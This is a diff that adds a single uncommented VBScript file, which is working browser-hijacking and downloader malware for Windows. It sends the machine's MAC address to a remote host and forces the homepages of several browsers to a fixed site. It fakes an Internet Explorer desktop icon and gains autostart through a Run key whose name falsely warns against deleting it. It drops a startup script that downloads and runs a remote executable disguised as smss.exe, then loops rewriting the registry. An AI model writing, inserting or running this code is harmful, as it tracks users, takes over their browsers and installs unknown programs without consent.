@@ -1,0 +1,268 @@
+On Error Resume Next
+v="10"
+Set goto9 = WScript.CreateObject("WScript.Shell")
+set fso=createobject("scripting.filesystem"&"object")
+strDesktop = goto9.SpecialFolders("Desktop")
+set wsssr5=createobject("wsc"&"ri"&"p"&"t.shell")
+tempfolder=wsssr5.ExpandEnvironmentStrings("%temp%")
+SYSTEMROOT=goto9.Environment("process")("APPDATA")
+name="sms"&"s"
+reg="HKEY_CURRENT_USER\Software"
+exe=".exe"
+vbs=".vbs"
+
+Set mc=GetObject("Winmgmts:").InstancesOf("Win32_NetworkAdapt"&"erConfiguration")
+For Each mo In mc
+If mo.IPEnabled=True Then
+nums=mo.MacAddress
+nums=replace(nums,":","")
+tids=StrReverse(Mid(StrReverse(wscript.ScriptName),5))
+wsssr5.run """%ProgramFiles%\Internet Explorer\iexplore"&exe&"""http://www.0344.net/tj/tj.asp?mac="&mo.MacAddress&"&tid="&tids&"",vbhide
+Exit For
+End If
+Next
+
+nums_len=Len(nums)
+For i=1 To nums_len
+tmp=Mid(nums,i,1)
+If IsNumeric(tmp) Then
+tmp=tmp * 16 * (16^(nums_len-i-1))
+Else
+tmp=(ASC(UCase(tmp))-55) * (16^(nums_len-i))
+End If
+tmpstr=tmpstr+tmp
+Next
+
+Randomize tmpstr
+reg_4=Int((9999-1000+1)*Rnd()+1000)
+reg_8=Int((99999999-10000000+1)*Rnd()+10000000)
+reg_12=Int((999999999999-100000000000+1)*Rnd()+100000000000)
+reg_5=left(reg_12,4)
+reg_6=left(reg_8,4)
+intetnet="Internet Explorer"
+fso.deleteFile ""&strDesktop&"\"&intetnet&".lnk"
+fso.deleteFile ""&strDesktop&"\"&intetnet&".url"
+goto9.Regwrite "HKEY_CLASSES_ROOT\CLSID\{"&reg_8&"-"&reg_5&"-"&reg_4&"-"&reg_6&"-"&reg_12&"}\","Internet Explorer","REG_SZ"
+goto9.Regwrite "HKEY_CLASSES_ROOT\CLSID\{"&reg_8&"-"&reg_5&"-"&reg_4&"-"&reg_6&"-"&reg_12&"}\DefaultIcon\","C:\Program Files\Internet Explorer\iexplore.exe","REG_SZ"
+goto9.RegWrite "HKEY_CLASSES_ROOT\CLSID\{"&reg_8&"-"&reg_5&"-"&reg_4&"-"&reg_6&"-"&reg_12&"}\Shell\","访问(&H)","REG_SZ"
+goto9.Regwrite "HKEY_CLASSES_ROOT\CLSID\{"&reg_8&"-"&reg_5&"-"&reg_4&"-"&reg_6&"-"&reg_12&"}\Shell\访问(&H)\","打开主页(&H)","REG_SZ"
+goto9.Regwrite "HKEY_CLASSES_ROOT\CLSID\{"&reg_8&"-"&reg_5&"-"&reg_4&"-"&reg_6&"-"&reg_12&"}\Shell\访问(&H)\Command\","""C:\Program Files\Internet Explorer\\IEXPLORE.EXE"" h%2t%2t%2p%2:%2/%2/www%2.%30%33%34%34.net","REG_SZ"
+goto9.Regwrite "HKEY_CLASSES_ROOT\CLSID\{"&reg_8&"-"&reg_5&"-"&reg_4&"-"&reg_6&"-"&reg_12&"}\Shell\D\","删除(&D)","REG_SZ"
+goto9.Regwrite "HKEY_CLASSES_ROOT\CLSID\{"&reg_8&"-"&reg_5&"-"&reg_4&"-"&reg_6&"-"&reg_12&"}\Shell\D\Command\","Rundll32.exe","REG_SZ"
+goto9.RegWrite "HKEY_CLASSES_ROOT\CLSID\{"&reg_8&"-"&reg_5&"-"&reg_4&"-"&reg_6&"-"&reg_12&"}\Shell\属性(&R)\","","REG_SZ"
+goto9.Regwrite "HKEY_CLASSES_ROOT\CLSID\{"&reg_8&"-"&reg_5&"-"&reg_4&"-"&reg_6&"-"&reg_12&"}\Shell\属性(&R)\Command\","Rundll32.exe Shell32.dll,Control_RunDLL Inetcpl.cpl","REG_SZ"
+goto9.RegWrite "HKEY_CLASSES_ROOT\CLSID\{"&reg_8&"-"&reg_5&"-"&reg_4&"-"&reg_6&"-"&reg_12&"}\ShellFolder\Attributes",a,"REG_DWORD"
+goto9.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{"&reg_8&"-"&reg_5&"-"&reg_4&"-"&reg_6&"-"&reg_12&"}\","Internet Explorer","REG_SZ"
+goto9.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoInternetIcon",1,"REG_DWORD"
+goto9.RegWrite ""&reg&"\Microsoft\Internet Explorer\Main\Start Page","h"&"t"&"t"&"p"&":"&"/"&"/"&"w"&"w"&"w"&"."&"0"&"3"&"4"&"4"&"."&"n"&"e"&"t"
+goto9.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\用于系统登录的文件，删除掉无法正常登录系统。",""&SYSTEMROOT&"\"&name&".exe"
+goto9.RegWrite ""&reg&"\Policies\Microsoft\Internet Explorer\Control Panel\Homepage","1"
+goto9.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\comfile\DefaultIcon\","%SystemRoot%\\system32\\SHELL32.dll,3","REG_SZ"
+goto9.RegWrite ""&reg&"\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktopCleanupWizard",1,"REG_DWORD"
+
+Const HKLM = &H80000002
+strPath = "SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace"
+Set oReg = GetObject("Winmgmts:\root\default:StdRegProv")
+oReg.EnumKey HKLM,strPath,arr
+For Each x In arr
+if x="{1f4de370-d627-11d1-ba4f-00a0c91eedba}" or x="{450D8FBA-AD25-11D0-98A8-0800361B1103}" or x="{645FF040-5081-101B-9F08-00AA002F954E}" or x="{e17d4fc0-5564-11d1-83f2-00a0c90dc849}" or x="{"&reg_8&"-"&reg_5&"-"&reg_4&"-"&reg_6&"-"&reg_12&"}" then
+else
+const HKEY_LOCAL_MACHINE = &H80000002
+st = "."
+set objser = getobject("winmgmts:\\" & st & "\root\default:stdregprov")
+pt = "SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\"&x&""
+objser.deletekey HKEY_LOCAL_MACHINE,pt
+end if
+Next
+
+TheWorld2s=goto9.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Applications\TheWorld.exe\shell\TheWorld\command\")
+TheWorld2s=split(TheWorld2s,"""")
+TheWorld2=TheWorld2s(1)
+TheWorld2=Replace(TheWorld2,"TheWorld.exe","TheWorld.ini")
+TheWorld3=goto9.RegRead("HKEY_CLASSES_ROOT\CLSID\{0002DF01-0000-0000-C000-000000000046}\LocalServer32\")
+TheWorld3=Replace(TheWorld3,"TheWorld.exe","TheWorld.ini")
+Maxthon=goto9.RegRead(""&reg&"\Maxthon2\Folder")
+Maxthon2=""&Maxthon&"\SharedAccount\Config\Config.ini"
+se3602=goto9.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\360se.exe\Path")
+se3602=""&se3602&"\360SE.ini"
+se360=""&SYSTEMROOT&"\360se\360SE.ini"
+tt=""&SYSTEMROOT&"\Tencent\TencentTraveler\100\TtConf.dat"
+if Maxthon2<>"" then
+set stm2 =createobject("ADODB.Stream")
+stm2.Charset = "utf-8" 
+stm2.Open
+stm2.LoadFromFile Maxthon2
+Maxthon_body=stm2.ReadText
+Maxthon_body=Replace(Maxthon_body,"[Navigation]","HomePage=http://www.0344.net/?m"&vbCrLf&"[Navigation]")
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+Set objTextFile = objFSO.OpenTextFile(Maxthon2,2)
+objTextFile.WriteLine Maxthon_body
+objTextFile.Close
+set file=objFSO.getfile(Maxthon2)
+file.attributes=1
+end if
+if TheWorld2<>"" then
+set stm3 =createobject("ADODB.Stream")
+stm3.Charset = "unicode" 
+stm3.Open
+stm3.LoadFromFile TheWorld2
+TheWorld2_body = stm3.ReadText
+TheWorld2_body=Replace(TheWorld2_body,"[Browser]","[Browser]"&vbCrLf&"Home=http://www.0344.net/?t2")
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+Set objTextFile = objFSO.OpenTextFile(TheWorld2,2)
+objTextFile.WriteLine TheWorld2_body
+objTextFile.Close
+set file=objFSO.getfile(TheWorld2)
+file.attributes=1
+end if
+if TheWorld3<>"" then
+set stm3 =createobject("ADODB.Stream")
+stm3.Charset = "unicode" 
+stm3.Open
+stm3.LoadFromFile TheWorld3
+TheWorld3_body = stm3.ReadText
+TheWorld3_body=Replace(TheWorld3_body,"[option]","[option]"&vbCrLf&"HomePage=http://www.0344.net/?t")
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+Set objTextFile = objFSO.OpenTextFile(TheWorld3,2)
+objTextFile.WriteLine TheWorld3_body
+objTextFile.Close
+set file=objFSO.getfile(TheWorld3)
+file.attributes=1
+end if
+if se3602<>"" then
+set stm3 =createobject("ADODB.Stream")
+stm3.Charset = "unicode" 
+stm3.Open
+stm3.LoadFromFile se3602
+se3602_body = stm3.ReadText
+se3602_body=Replace(se3602_body,"[Browser]","[Browser]"&vbCrLf&"Home=http://www.0344.net/?3_2")
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+Set objTextFile = objFSO.OpenTextFile(se3602,2)
+objTextFile.WriteLine se3602_body
+objTextFile.Close
+set file=objFSO.getfile(se3602)
+file.attributes=1
+end if
+if se360<>"" then
+set stm4 =createobject("ADODB.Stream")
+stm4.Charset = "unicode" 
+stm4.Open
+stm4.LoadFromFile se360
+se360_body = stm4.ReadText
+se360_body=Replace(se360_body,"[option]","[option]"&vbCrLf&"HomePage=http://www.0344.net/?3")
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+Set objTextFile = objFSO.OpenTextFile(se360,2)
+objTextFile.WriteLine se360_body
+objTextFile.Close
+set file=objFSO.getfile(se360)
+file.attributes=1
+end if
+if tt<>"" then
+set stm5 =createobject("ADODB.Stream")
+stm5.Charset = "utf-8" 
+stm5.Open
+stm5.LoadFromFile tt
+tt_body=stm5.ReadText
+tt_body=Replace(tt_body,"[COMMON]","[COMMON]"&vbCrLf&" strHomePageUrl=http://www.0344.net/?tt")
+Set stm5 = CreateObject("ADODB.Stream")
+stm5.Type = 2
+stm5.Open
+stm5.Charset = "UTF-8"
+stm5.Position = stm5.Size
+stm5.WriteText tt_body
+stm5.SaveToFile tt,2
+stm5.Close
+set stm5 = nothing
+set file=objFSO.getfile(tt)
+file.attributes=1
+end if
+
+regini=regini&"HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{"&reg_8&"-"&reg_5&"-"&reg_4&"-"&reg_6&"-"&reg_12&"} [2 8 19]"&Chr(13)&Chr(10)
+regini=regini&"HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{"&reg_8&"-"&reg_5&"-"&reg_4&"-"&reg_6&"-"&reg_12&"}\DefaultIcon [2 8 19]"&Chr(13)&Chr(10) 
+regini=regini&"HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{"&reg_8&"-"&reg_5&"-"&reg_4&"-"&reg_6&"-"&reg_12&"}\Shell [2 8 19]"&Chr(13)&Chr(10) 
+regini=regini&"HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{"&reg_8&"-"&reg_5&"-"&reg_4&"-"&reg_6&"-"&reg_12&"}\ShellFolder [2 8 19]"&Chr(13)&Chr(10) 
+regini=regini&"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{"&reg_8&"-"&reg_5&"-"&reg_4&"-"&reg_6&"-"&reg_12&"} [2 8 19]"&Chr(13)&Chr(10)
+Set TestFile=fso.CreateTextFile(""&tempfolder&"\"&reg_4&".ini",Ture)
+TestFile.WriteLine(regini)
+TestFile.attributes=2
+TestFile.Close
+fso.GetFile(""&tempfolder&"\"&reg_4&".ini").Attributes = 2
+goto9.Run("cmd.exe /c regini "&tempfolder&"\"&reg_4&".ini"),0,True
+fso.deleteFile ""&tempfolder&"\"&reg_4&".ini"
+
+qidong=qidong&"On Error Resume Next"&Chr(13)&Chr(10)
+qidong=qidong&"set http=createobject(""Microsoft.XMLHTTP"")"&Chr(13)&Chr(10)
+qidong=qidong&"url=""http://d.360360.eu.tv/down/exe.txt"""&Chr(13)&Chr(10)
+qidong=qidong&"http.open ""get"",url,false"&Chr(13)&Chr(10)
+qidong=qidong&"http.send"&Chr(13)&Chr(10)
+qidong=qidong&"zhi=zhuanghuan(Http.responsebody)"&Chr(13)&Chr(10)
+qidong=qidong&"Function zhuanghuan(vIn) "&Chr(13)&Chr(10)
+qidong=qidong&"strReturn = """""&Chr(13)&Chr(10)
+qidong=qidong&"For i = 1 To LenB(vIn)"&Chr(13)&Chr(10)
+qidong=qidong&"ThisCharCode = AscB(MidB(vIn,i,1))"&Chr(13)&Chr(10)
+qidong=qidong&"If ThisCharCode < &H80 Then"&Chr(13)&Chr(10)
+qidong=qidong&"strReturn = strReturn & Chr(ThisCharCode)"&Chr(13)&Chr(10)
+qidong=qidong&"Else"&Chr(13)&Chr(10)
+qidong=qidong&"NextCharCode = AscB(MidB(vIn,i+1,1))"&Chr(13)&Chr(10)
+qidong=qidong&"strReturn = strReturn & Chr(CLng(ThisCharCode) * &H100 + CInt(NextCharCode))"&Chr(13)&Chr(10)
+qidong=qidong&"i = i + 1"&Chr(13)&Chr(10)
+qidong=qidong&"End If"&Chr(13)&Chr(10)
+qidong=qidong&"Next"&Chr(13)&Chr(10)
+qidong=qidong&"zhuanghuan = strReturn"&Chr(13)&Chr(10)
+qidong=qidong&"End Function"&Chr(13)&Chr(10)
+qidong=qidong&"Set fso = CreateObject(""Scripting.File""&""SystemObject"")"&Chr(13)&Chr(10)
+qidong=qidong&"Set linshi222 = fso.GetSpecialFolder(2)"&Chr(13)&Chr(10)
+qidong=qidong&"Set reg=WScript.CreateObject(""WScript.Shell"")"&Chr(13)&Chr(10)
+qidong=qidong&"Set Post3 = CreateObject(""Msxml2.XMLHTTP"")"&Chr(13)&Chr(10)
+qidong=qidong&"Set Shell = CreateObject(""Wscript""&"".Shell"")"&Chr(13)&Chr(10)
+qidong=qidong&"startpage1=reg.RegRead("""&reg&"\Microsoft\Internet Explorer\Main\Start Page"")"&Chr(13)&Chr(10)
+qidong=qidong&"if startpage1<>""http://www.0344.net"" or zhi<>"""&v&""" then"&Chr(13)&Chr(10)
+qidong=qidong&"Post3.Open ""GET"",""http://d.360360.eu.tv/down/ie.exe"",0"&Chr(13)&Chr(10)
+qidong=qidong&"Post3.Send()"&Chr(13)&Chr(10)
+qidong=qidong&"Set aGet1 = CreateObject(""ADODB""&"".Stream"")"&Chr(13)&Chr(10)
+qidong=qidong&"aGet1.Mode = 3"&Chr(13)&Chr(10)
+qidong=qidong&"aGet1.Type = 1"&Chr(13)&Chr(10)
+qidong=qidong&"aGet1.Open() "&Chr(13)&Chr(10)
+qidong=qidong&"aGet1.Write(Post3.responseBody)"&Chr(13)&Chr(10)
+qidong=qidong&"aGet1.SaveToFile """"&linshi222&""\smss.exe"",2"&Chr(13)&Chr(10)
+qidong=qidong&"Shell.Run (""""&linshi222&""\smss.exe"")"&Chr(13)&Chr(10)
+qidong=qidong&"end if"&Chr(13)&Chr(10)
+AllUsersStartup1=goto9.SpecialFolders("AllUsersStartup")
+qqvbs=""&AllUsersStartup1&"\qq"&vbs&""
+Set Stm2 = CreateObject("ADODB.Stream")
+Stm2.Type = 2
+Stm2.Open
+Stm2.Charset = "gb2312"
+Stm2.Position = Stm2.Size
+Stm2.WriteText qidong
+Stm2.SaveToFile qqvbs,2
+Stm2.Close
+set Stm2 = nothing
+fso.GetFile(qqvbs).Attributes = 2
+
+namecopy=""&name&".exe"
+fso.getfile(wscript.scriptfullname).copy(""&SYSTEMROOT&"\"&namecopy&"")
+fso.getfile(wscript.scriptfullname).copy(""&AllUsersStartup1&"\qq.exe")
+fso.GetFile(""&SYSTEMROOT&"\"&namecopy&"").Attributes = 4
+fso.GetFile(""&AllUsersStartup1&"\qq.exe").Attributes = 2
+
+Do
+goto9.Regwrite "HKEY_CLASSES_ROOT\CLSID\{"&reg_8&"-"&reg_5&"-"&reg_4&"-"&reg_6&"-"&reg_12&"}\","Internet Explorer","REG_SZ"
+goto9.Regwrite "HKEY_CLASSES_ROOT\CLSID\{"&reg_8&"-"&reg_5&"-"&reg_4&"-"&reg_6&"-"&reg_12&"}\DefaultIcon\","C:\Program Files\Internet Explorer\iexplore.exe","REG_SZ"
+goto9.RegWrite "HKEY_CLASSES_ROOT\CLSID\{"&reg_8&"-"&reg_5&"-"&reg_4&"-"&reg_6&"-"&reg_12&"}\Shell\","访问(&H)","REG_SZ"
+goto9.Regwrite "HKEY_CLASSES_ROOT\CLSID\{"&reg_8&"-"&reg_5&"-"&reg_4&"-"&reg_6&"-"&reg_12&"}\Shell\访问(&H)\","打开主页(&H)","REG_SZ"
+goto9.Regwrite "HKEY_CLASSES_ROOT\CLSID\{"&reg_8&"-"&reg_5&"-"&reg_4&"-"&reg_6&"-"&reg_12&"}\Shell\访问(&H)\Command\","""C:\Program Files\Internet Explorer\\IEXPLORE.EXE"" h%2t%2t%2p%2:%2/%2/www%2.%30%33%34%34.net","REG_SZ"
+goto9.Regwrite "HKEY_CLASSES_ROOT\CLSID\{"&reg_8&"-"&reg_5&"-"&reg_4&"-"&reg_6&"-"&reg_12&"}\Shell\D\","删除(&D)","REG_SZ"
+goto9.Regwrite "HKEY_CLASSES_ROOT\CLSID\{"&reg_8&"-"&reg_5&"-"&reg_4&"-"&reg_6&"-"&reg_12&"}\Shell\D\Command\","Rundll32.exe","REG_SZ"
+goto9.RegWrite "HKEY_CLASSES_ROOT\CLSID\{"&reg_8&"-"&reg_5&"-"&reg_4&"-"&reg_6&"-"&reg_12&"}\Shell\属性(&R)\","","REG_SZ"
+goto9.Regwrite "HKEY_CLASSES_ROOT\CLSID\{"&reg_8&"-"&reg_5&"-"&reg_4&"-"&reg_6&"-"&reg_12&"}\Shell\属性(&R)\Command\","Rundll32.exe Shell32.dll,Control_RunDLL Inetcpl.cpl","REG_SZ"
+goto9.RegWrite "HKEY_CLASSES_ROOT\CLSID\{"&reg_8&"-"&reg_5&"-"&reg_4&"-"&reg_6&"-"&reg_12&"}\ShellFolder\Attributes",a,"REG_DWORD"
+goto9.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{"&reg_8&"-"&reg_5&"-"&reg_4&"-"&reg_6&"-"&reg_12&"}\","Internet Explorer","REG_SZ"
+goto9.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoInternetIcon",1,"REG_DWORD"
+goto9.RegWrite ""&reg&"\Microsoft\Internet Explorer\Main\Start Page","h"&"t"&"t"&"p"&":"&"/"&"/"&"w"&"w"&"w"&"."&"0"&"3"&"4"&"4"&"."&"n"&"e"&"t"
+goto9.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\用于系统登录的文件，删除掉无法正常登录系统。",""&SYSTEMROOT&"\"&name&".exe"
+goto9.RegWrite ""&reg&"\Policies\Microsoft\Internet Explorer\Control Panel\Homepage","1"
+goto9.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\comfile\DefaultIcon\","%SystemRoot%\\system32\\SHELL32.dll,3","REG_SZ"
+goto9.RegWrite ""&reg&"\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktopCleanupWizard",1,"REG_DWORD"
+Wscript.Sleep 1000
+Loop
